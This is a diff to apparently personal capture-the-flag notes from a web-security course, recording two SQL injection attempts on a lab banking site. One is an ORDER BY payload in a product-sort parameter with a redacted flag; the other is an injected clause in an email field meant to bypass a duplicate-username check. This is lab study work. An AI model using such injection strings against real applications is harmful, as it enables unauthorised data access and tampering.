@@ -68,4 +68,20 @@ COMP6443{LOGIN_USING_ADMIN_CREDS.redacted}
 
 
 
+flag 4
+
+sorting bank products
+injection payload:
+'))order+by+id--+
+COMP6443{USE_BY_ORDER.redacted}
+
+
+
+flag 5 
+
+email=jack%40jillmail.com'+and+1=0--+
+trying to use sql injections to bypass the duplicate username
+
+
+
 
